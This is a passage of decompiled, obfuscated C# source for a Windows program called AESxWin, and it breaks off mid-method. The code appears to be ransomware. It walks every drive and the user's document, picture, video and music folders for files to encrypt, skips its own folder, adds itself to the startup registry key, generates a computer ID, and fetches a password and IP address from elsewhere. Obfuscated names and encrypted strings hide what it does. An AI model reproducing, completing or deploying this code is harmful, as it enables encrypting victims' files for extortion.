using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using A6yJVNZuoAn9NC1LAS;
using AESxWin.Helpers;
using Microsoft.Win32;
using WKtExBGrT2f6h026To;

namespace AESxWin;

public class _008C_0091_0086_0086_0086_0091_008C_0087_0094_008A_0094_008F_0094_0093_0094_0086_0090_008D_008F_0094_008A_008C_0093_008D_008E_0093_0086_0088_008E_0088_0092_008B_0087_0091_0094_008E : Form
{
	public static string[] image_ext;

	public static string[] video_ext;

	public static string[] audio_ext;

	public static string[] document_ext;

	public static string[] compressed_ext;

	public static string[] code_ext;

	public List<string> StartPaths;

	private BackgroundWorker bwEncryptor;

	private BackgroundWorker bwPathFinder;

	private Queue<string> PathsQueue;

	private bool FinishedPathFinder;

	private long EncryptionCount;

	private long TotalFindPaths;

	private bool requestSent;

	private bool _isAutostart;

	private string _currentPassword;

	private string _currentIP;

	private bool _isStarted;

	private IContainer components;

	private Button btnStartAutoEncrypt;

	private Timer timer1;

	private Timer timer2;

	private Button button3;

	private Timer timer3;

	private ComboBox comboBox2;

	private Timer timer4;

	private CheckBox checkBox1;

	private Button button8;

	private ComboBox comboBox3;

	private Button button9;

	private Button button10;

	private ComboBox comboBox1;

	private CheckBox chckIsStartup;

	private Button button1;

	private WebBrowser webBrowser1;

	private Button button12;

	private Button button11;

	private Timer timer5;

	private BackgroundWorker backgroundWorker1;

	public static string LogPath
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public static string ErrorLogPath
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public List<string> IgnoredPaths
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public string[] SearchExtensions
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	public bool IsStartup
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(196), writable: true);
			return registryKey.GetValue(Assembly.GetExecutingAssembly().GetName().Name) != null;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			_008B_0091_0087_008B_008B_008B_0087_0090_0094_0089_0087_0093_008C_0090_0090_0090_0088_0094_0089_0090_008C_008B_0095_008A_0087_0086_0089_0092_0091_008B_008E_008F_0094_0094_008E_0088.RegisterInStartup(value, Application.get_ExecutablePath());
		}
	}

	public bool IsAutostart
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			return _isAutostart;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			_isAutostart = value;
		}
	}

	public string CurrentPassword
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			return _currentPassword;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			_currentPassword = value;
		}
	}

	public string CurrentIP
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			return _currentIP;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			_currentIP = value;
		}
	}

	public Guid ComputerId
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005, IL_00d8
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_007d: Incompatible stack heights: 0 vs 1
			int num = 2;
			Guid result = default(Guid);
			Guid result2 = default(Guid);
			bool flag = default(bool);
			string text = default(string);
			while (true)
			{
				int num3;
				int num2;
				switch (num)
				{
				case 6:
				case 8:
					_008B_0091_0087_008B_008B_008B_0087_0090_0094_0089_0087_0093_008C_0090_0090_0090_0088_0094_0089_0090_008C_008B_0095_008A_0087_0086_0089_0092_0091_008B_008E_008F_0094_0094_008E_0088.Write(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(200), result);
					goto case 5;
				case 2:
					result = default(Guid);
					num3 = 3;
					goto IL_00dd;
				case 5:
				case 7:
				case 9:
					result2 = result;
					num3 = 10;
					goto IL_00dd;
				case 4:
					flag = text != null;
					num2 = 1;
					if (true)
					{
						goto IL_00e1;
					}
					goto case 5;
				case 3:
					text = _008B_0091_0087_008B_008B_008B_0087_0090_0094_0089_0087_0093_008C_0090_0090_0090_0088_0094_0089_0090_008C_008B_0095_008A_0087_0086_0089_0092_0091_008B_008E_008F_0094_0094_008E_0088.Read(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(200));
					num2 = 4;
					if (0 == 0)
					{
						goto IL_00e1;
					}
					goto case 1;
				case 1:
					if (!flag)
					{
						result = Guid.NewGuid();
						_ = 1;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							num2 = 8;
							if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								goto case 5;
							}
							goto IL_00e1;
						}
						num3 = 5;
					}
					else
					{
						num3 = 0;
					}
					goto IL_00dd;
				case 0:
					Guid.TryParse(text, out result);
					goto case 5;
				default:
					num2 = 9;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						goto IL_00e1;
					}
					break;
				case 10:
					break;
					IL_00dd:
					num2 = num3;
					goto IL_00e1;
				}
				break;
				IL_00e1:
				num = num2;
			}
			return result2;
		}
	}

	public bool IsStarted
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get
		{
			//Discarded unreachable code: IL_0005
			//IL_0006: Incompatible stack heights: 0 vs 1
			return _isStarted;
		}
		[MethodImpl(MethodImplOptions.NoInlining)]
		set
		{
			//Discarded unreachable code: IL_0005, IL_0028
			//IL_0006: Incompatible stack heights: 0 vs 1
			_ = 1;
			int num;
			if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				num = 6;
				goto IL_0031;
			}
			int num2 = 1;
			goto IL_0035;
			IL_0035:
			bool isStarted = default(bool);
			while (true)
			{
				switch (num2)
				{
				case 1:
				case 2:
					if (isStarted)
					{
						goto case 3;
					}
					((Control)btnStartAutoEncrypt).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(208));
					num = 7;
					if (false)
					{
						goto IL_00ab;
					}
					break;
				default:
					num = 3;
					break;
				case 4:
					isStarted = _isStarted;
					goto case 1;
				case 5:
					return;
				case 0:
				case 6:
					goto IL_00ab;
				case 3:
					((Control)btnStartAutoEncrypt).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(204));
					num = 5;
					break;
				case 7:
					return;
				}
				break;
				IL_00ab:
				_isStarted = value;
				num2 = 4;
			}
			goto IL_0031;
			IL_0031:
			num2 = num;
			goto IL_0035;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public _008C_0091_0086_0086_0086_0091_008C_0087_0094_008A_0094_008F_0094_0093_0094_0086_0090_008D_008F_0094_008A_008C_0093_008D_008E_0093_0086_0088_008E_0088_0092_008B_0087_0091_0094_008E()
	{
		//Discarded unreachable code: IL_0005, IL_01bb
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 28;
		bool flag = default(bool);
		DateTime now = default(DateTime);
		string text = default(string);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				IL_01c4:
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 30:
						InitSearchExtensions();
						num3 = 11;
						continue;
					default:
						flag = !Directory.Exists(LogPath);
						num = 9;
						goto end_IL_01c8;
					case 23:
						now = DateTime.Now;
						num3 = 5;
						continue;
					case 5:
						text = now.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(216));
						num2 = 21;
						if (0 == 0)
						{
							goto IL_01c4;
						}
						goto case 15;
					case 15:
						_currentIP = string.Empty;
						num2 = 31;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto IL_01c4;
						}
						goto case 0;
					case 0:
						TotalFindPaths = 0L;
						num = 10;
						goto end_IL_01c8;
					case 31:
						break;
					case 32:
						Directory.CreateDirectory(LogPath);
						num3 = 23;
						continue;
					case 9:
						if (!flag)
						{
							goto case 23;
						}
						num2 = 32;
						if (true)
						{
							goto IL_01c4;
						}
						goto case 18;
					case 18:
						GetIP();
						num2 = 19;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_01c4;
						}
						goto case 17;
					case 3:
						_isAutostart = true;
						num = 22;
						goto end_IL_01c8;
					case 4:
						InitStartPaths();
						num = 18;
						goto end_IL_01c8;
					case 6:
					case 13:
						((Form)this)._002Ector();
						num3 = 20;
						continue;
					case 2:
						bwPathFinder = null;
						num2 = 25;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto IL_01c4;
						}
						goto case 11;
					case 11:
						InitIgnoredPaths();
						num3 = 4;
						continue;
					case 24:
						EncryptionCount = 0L;
						num = 0;
						goto end_IL_01c8;
					case 28:
						if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(44))
						{
							num = 26;
							goto end_IL_01c8;
						}
						return;
					case 17:
						FinishedPathFinder = false;
						num = 24;
						goto end_IL_01c8;
					case 8:
						LogPath = _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(212);
						goto default;
					case 12:
						bwEncryptor = null;
						num2 = 2;
						goto IL_01c4;
					case 21:
						LogPath = Path.Combine(LogPath, text + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(220));
						num3 = 1;
						continue;
					case 27:
						IsStartup = true;
						num2 = 14;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto IL_01c4;
						}
						goto case 14;
					case 26:
						StartPaths = new List<string>();
						num2 = 12;
						goto IL_01c4;
					case 1:
						ErrorLogPath = Path.Combine(LogPath, text + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(224));
						num = 29;
						goto end_IL_01c8;
					case 19:
						GetPassword();
						num = 33;
						goto end_IL_01c8;
					case 20:
						InitializeComponent();
						num = 8;
						goto end_IL_01c8;
					case 25:
						PathsQueue = new Queue<string>();
						num2 = 17;
						if (0 == 0)
						{
							goto IL_01c4;
						}
						goto case 14;
					case 14:
						chckIsStartup.set_Checked(IsStartup);
						num = 30;
						goto end_IL_01c8;
					case 10:
						requestSent = false;
						num3 = 3;
						continue;
					case 29:
						_008A_0094_0086_0089_0094_0094_008B_0090_0091_008C_0095_008A_008C_008C_0095_0086_0089_0092_008D_008F_008B_008C_008F_0087_0086_0093_0089_0087_0094_008C_0090_0095_008C_0088_008D_0086.WriteLog(LogPath, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(228));
						num = 27;
						goto end_IL_01c8;
					case 22:
						_currentPassword = string.Empty;
						num3 = 15;
						continue;
					case 33:
						return;
					}
					_isStarted = false;
					components = null;
					_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						num3 = 6;
						continue;
					}
					num2 = 7;
					goto IL_01c4;
					continue;
					end_IL_01c8:
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitSearchExtensions()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		SearchExtensions = image_ext;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitIgnoredPaths()
	{
		//Discarded unreachable code: IL_0005, IL_00c2
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0059: Incompatible stack heights: 0 vs 1
		int num = 4;
		if (1 == 0)
		{
			goto IL_0016;
		}
		goto IL_00cb;
		IL_00cb:
		int num2;
		while (true)
		{
			switch (num)
			{
			case 2:
			case 7:
				break;
			case 1:
				goto IL_0039;
			case 4:
				goto IL_0069;
			case 6:
				goto IL_007f;
			case 0:
			case 3:
				goto IL_00aa;
			default:
				num = 6;
				if (0 == 0)
				{
					continue;
				}
				goto case 5;
			case 5:
				IgnoredPaths.Add(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(232));
				num2 = 8;
				goto IL_00c7;
			case 8:
				return;
			}
			break;
			IL_0069:
			IgnoredPaths = new List<string>();
			num2 = 1;
			goto IL_00c7;
		}
		goto IL_0016;
		IL_00c7:
		num = num2;
		goto IL_00cb;
		IL_0039:
		IgnoredPaths.Add(Path.GetDirectoryName(Application.get_ExecutablePath()));
		_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
		num2 = (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092() ? 7 : 0);
		goto IL_00c7;
		IL_007f:
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
		num = 5;
		if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			goto IL_0039;
		}
		goto IL_00cb;
		IL_0016:
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		goto IL_00aa;
		IL_00aa:
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
		goto IL_007f;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitStartPaths()
	{
		//Discarded unreachable code: IL_0005, IL_00eb
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_01e0: Incompatible stack heights: 0 vs 1
		int num = 10;
		int num3 = default(int);
		DriveInfo[] array = default(DriveInfo[]);
		DriveInfo driveInfo = default(DriveInfo);
		DriveInfo[] drives = default(DriveInfo[]);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num4;
				switch (num2)
				{
				case 9:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
					num = 15;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 11;
				case 19:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
					num4 = 11;
					goto IL_00f0;
				case 17:
					num3++;
					goto case 2;
				case 16:
					num3 = 0;
					num = 2;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 5;
				case 5:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
					num = 4;
					if (true)
					{
						break;
					}
					goto case 2;
				case 2:
				case 14:
				case 20:
					if (num3 < array.Length)
					{
						driveInfo = array[num3];
						num2 = 1;
					}
					else
					{
						num2 = 23;
					}
					continue;
				case 13:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
					goto case 0;
				default:
					num2 = 0;
					continue;
				case 4:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
					num4 = 9;
					goto IL_00f0;
				case 11:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
					num = 22;
					if (true)
					{
						break;
					}
					goto case 7;
				case 7:
				case 21:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
					num = 3;
					if (0 == 0)
					{
						break;
					}
					goto case 15;
				case 15:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
					_ = 0;
					if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num = 14;
						if (true)
						{
							break;
						}
						goto case 16;
					}
					num2 = 21;
					continue;
				case 10:
					if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(48))
					{
						num2 = 8;
						continue;
					}
					drives = _0092_008C_0095_0095_0095_008C_008D_0089_008D_0090_0086_008A_0094_0092_008B_008B_0093_0089_008E_008D_0087_0086_008A_008E_0091_0086_0087_0089_008F_0087_0089_008F_0086_008E_0093_008E.GetDrives();
					num2 = 6;
					continue;
				case 6:
				{
					Guid computerId = ComputerId;
					num = 5;
					if (false)
					{
						return;
					}
					break;
				}
				case 8:
					return;
				case 22:
					array = drives;
					num = 16;
					if (0 == 0)
					{
						break;
					}
					goto case 0;
				case 0:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
					num4 = 12;
					goto IL_00f0;
				case 3:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
					num2 = 18;
					continue;
				case 18:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
					num = 13;
					break;
				case 1:
					StartPaths.Add(driveInfo.RootDirectory.Name);
					num2 = 17;
					continue;
				case 12:
					StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
					num = 19;
					break;
				case 23:
					return;
					IL_00f0:
					num = num4;
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CGetPassword_003Ed__55))]
	private void GetPassword()
	{
		//Discarded unreachable code: IL_0005, IL_005a
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 7;
		_003CGetPassword_003Ed__55 stateMachine = default(_003CGetPassword_003Ed__55);
		AsyncVoidMethodBuilder _003C_003Et__builder = default(AsyncVoidMethodBuilder);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3;
				switch (num2)
				{
				case 7:
					stateMachine = new _003CGetPassword_003Ed__55();
					num = 1;
					if (true)
					{
						break;
					}
					goto case 2;
				case 2:
				case 5:
					_003C_003Et__builder.Start(ref stateMachine);
					num3 = 8;
					goto IL_005f;
				case 1:
					stateMachine._003C_003E4__this = this;
					num3 = 3;
					goto IL_005f;
				case 6:
					stateMachine._003C_003E1__state = -1;
					goto default;
				default:
					_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num = 0;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							break;
						}
						goto case 0;
					}
					num = 2;
					break;
				case 0:
				case 4:
					_003C_003Et__builder = stateMachine._003C_003Et__builder;
					goto case 2;
				case 3:
					goto IL_00d3;
				case 8:
					return;
					IL_005f:
					num = num3;
					break;
				}
				break;
				IL_00d3:
				stateMachine._003C_003Et__builder = AsyncVoidMethodBuilder.Create();
				num2 = 6;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	[DebuggerStepThrough]
	[AsyncStateMachine(typeof(_003CGetIP_003Ed__56))]
	private void GetIP()
	{
		//Discarded unreachable code: IL_0005, IL_0068
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_00c1: Incompatible stack heights: 0 vs 1
		int num = 4;
		AsyncVoidMethodBuilder _003C_003Et__builder = default(AsyncVoidMethodBuilder);
		_003CGetIP_003Ed__56 stateMachine = default(_003CGetIP_003Ed__56);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				IL_0071:
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 2:
						_003C_003Et__builder = stateMachine._003C_003Et__builder;
						num3 = 0;
						continue;
					case 1:
					case 7:
						stateMachine._003C_003E4__this = this;
						num2 = 6;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_0071;
						}
						goto case 6;
					case 6:
						stateMachine._003C_003Et__builder = AsyncVoidMethodBuilder.Create();
						goto case 3;
					case 3:
					case 5:
						stateMachine._003C_003E1__state = -1;
						goto case 2;
					default:
						num2 = 2;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto IL_0071;
						}
						break;
					case 4:
						break;
					case 0:
						goto IL_00d1;
					case 8:
						return;
					}
					break;
				}
				stateMachine = new _003CGetIP_003Ed__56();
				_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
				num = (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092() ? 7 : 5);
				break;
				IL_00d1:
				_003C_003Et__builder.Start(ref stateMachine);
				num = 8;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void chckIsStartup_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		IsStartup = chckIsStartup.get_Checked();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void btnStartAutoEncrypt_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_00b2
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 0;
		bool enabled = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num2;
			switch (num)
			{
			case 4:
			case 5:
				Start();
				num2 = 6;
				if (false)
				{
					goto case 0;
				}
				goto IL_00bb;
			case 0:
				enabled = ((Control)btnStartAutoEncrypt).get_Enabled();
				num = 1;
				break;
			case 8:
				flag = !IsStarted;
				_ = 0;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num = 4;
					break;
				}
				num2 = 2;
				goto IL_00bb;
			case 7:
				IsStarted = !IsStarted;
				goto case 4;
			case 6:
				return;
			case 1:
				if (enabled)
				{
					num = 8;
					break;
				}
				return;
			case 2:
			case 3:
				if (!flag)
				{
					Stop();
					num = 9;
					break;
				}
				goto case 7;
			default:
				num = 7;
				break;
			case 9:
				return;
				IL_00bb:
				num = num2;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Start()
	{
		//Discarded unreachable code: IL_0005, IL_00d5, IL_0173, IL_02ae
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 6;
		if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			goto IL_001a;
		}
		goto IL_017c;
		IL_017c:
		int num2 = num;
		goto IL_0180;
		IL_0180:
		bool lockTaken = default(bool);
		Queue<string> pathsQueue = default(Queue<string>);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string text = default(string);
		while (true)
		{
			int num4;
			switch (num2)
			{
			case 9:
				break;
			case 11:
				goto IL_0040;
			case 1:
				lockTaken = false;
				num = 10;
				if (false)
				{
					goto case 6;
				}
				goto IL_017c;
			case 6:
				if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(52))
				{
					num = 14;
					if (1 == 0)
					{
						goto case 16;
					}
					goto IL_017c;
				}
				return;
			case 16:
				bwEncryptor.RunWorkerAsync();
				num2 = 7;
				continue;
			case 10:
				try
				{
					Monitor.Enter(pathsQueue, ref lockTaken);
					_ = 1;
					int num5;
